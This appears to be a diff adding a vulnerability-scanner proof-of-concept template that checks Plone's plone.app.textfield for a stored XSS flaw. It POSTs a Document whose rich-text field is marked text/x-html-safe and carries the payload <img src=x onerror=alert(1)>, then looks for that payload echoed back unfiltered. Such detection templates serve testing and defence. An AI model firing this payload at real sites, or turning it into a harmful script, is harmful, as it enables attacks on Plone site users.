@@ -1,0 +1,38 @@
+[info]
+author = "AVE"
+description = "验证 plone.app.textfield 组件中因 MIME 类型匹配绕过 safe_html 过滤导致的存储型 XSS 漏洞。通过 REST API 创建内容并设置 RichText 字段的 mimeType 为 text/x-html-safe，注入 XSS 载荷，验证未经过滤的 HTML 被直接返回。"
+id = "POC-AVE-2026-0564"
+name = "Plone plone.app.textfield Stored XSS PoC"
+severity = "medium"
+tags = [
+    "cve-2026-54503",
+    "xss",
+    "plone",
+    "stored-xss",
+]
+vuln_id = [
+    "CVE-2026-54503",
+    "AVE-2026-0564",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/@content"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"@type":"Document","title":"XSS Test","text":{"data":"<img src=x onerror=alert(1)>","content-type":"text/x-html-safe","encoding":"utf-8"}}'
+type = "json"
+
+[poc.requests.headers]
+Accept = "application/json"
+Content-Type = "application/json"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["<img src=x onerror=alert(1)>"]
